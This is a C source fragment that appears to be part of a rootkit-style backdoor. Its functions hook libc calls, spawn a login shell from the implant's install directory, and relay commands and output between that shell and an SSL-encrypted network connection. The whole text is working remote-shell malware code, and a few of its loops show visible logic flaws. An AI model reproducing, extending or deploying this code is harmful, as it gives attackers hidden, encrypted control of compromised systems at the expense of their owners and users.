int write_loop(int fd, char *buf){
    char *p = buf;
    size_t buflen = strlen(buf);
    ssize_t n;

    hook(CWRITE);

    while(p - buf < buflen) {
        n = (ssize_t)call(CWRITE, fd, p, buflen - (p - buf));
        if(n < 0 && errno == EINTR) continue;
        else if(n < 0) break;
        p += n;
    }

    return p - buf;
}

int ssl_spawn_shell(int stdin[], int stdout[]){
    pid_t pid;

    if(pipe(stdin) < 0 || pipe(stdout) < 0) return -1;
    if((pid = fork()) < 0) return -1;

    if(pid == 0){
        close(stdin[1]);
        close(stdout[0]);

        /* rearrange stdin and stdout */
        dup2(stdin[0], 0);
        dup2(stdout[1], 1);
        dup2(stdout[1], 2);

        hook(CCHDIR);
        call(CCHDIR, INSTALL_DIR);
        system(PRE_SHELL);
        execl(SHELL_PATH, SHELL_NAME, "--login", NULL);
    }

    close(stdin[0]);
    close(stdout[1]);

    return 1;
}

void cmd_loop(int sockfd){
    int child_stdin[2], child_stdout[2],
        maxfd, r, cnt, ssl_err;
    char buf[DEFAULT_TCP_BUF_LEN],
         tmp[512], *tmp_str;
    ssize_t n_r;

    hook(CREAD);

    if(ssl_spawn_shell(child_stdin, child_stdout) < 0) goto end_cmd_loop;

    maxfd = child_stdout[0];
    if(sockfd > maxfd) maxfd = sockfd;

    for(;;){
        fd_set fds;

        FD_ZERO(&fds);
        FD_SET(sockfd, &fds);
        FD_SET(child_stdout[0], &fds);

        r = select(maxfd + 1, &fds, NULL, NULL, NULL);

        if(r < 0 && errno == EINTR) continue;
        else if(r < 0) break;

        if(FD_ISSET(sockfd, &fds)){
            do{
                memset(&buf, '\0', sizeof(buf));
                n_r = SSL_read(ssl, buf, sizeof(buf) - 1);

                ssl_err = SSL_get_error(ssl, n_r);
                if(ssl_err == SSL_ERROR_ZERO_RETURN) goto end_cmd_loop;
                else if(ssl_err != SSL_ERROR_NONE &&
                        ssl_err != SSL_ERROR_WANT_READ &&
                        ssl_err != SSL_ERROR_WANT_WRITE) goto end_cmd_loop;

                write_loop(child_stdin[1], buf);
            }while(SSL_pending(ssl));
        }

        if(FD_ISSET(child_stdout[0], &fds)){
            memset(&buf, '\0', sizeof(buf));
            n_r = (ssize_t)call(CREAD, child_stdout[0], buf, sizeof(buf));
            if(n_r <= 0) break;
            else if(n_r <= sizeof(tmp)) s_write(buf);
        }else{
            while(n_r > sizeof(tmp)){
                ++cnt;
                strncpy(tmp, buf, sizeof(tmp) - 1);
                s_write(tmp);
                n_r -= sizeof(tmp);
                tmp_str = &buf[sizeof(tmp)];
                strncpy(buf, tmp_str, sizeof(buf) - 1);
            }
            s_write(buf);
        }
    }

end_cmd_loop:
    if(ssl != NULL){
        SSL_shutdown(ssl);
        SSL_free(ssl);
    }
}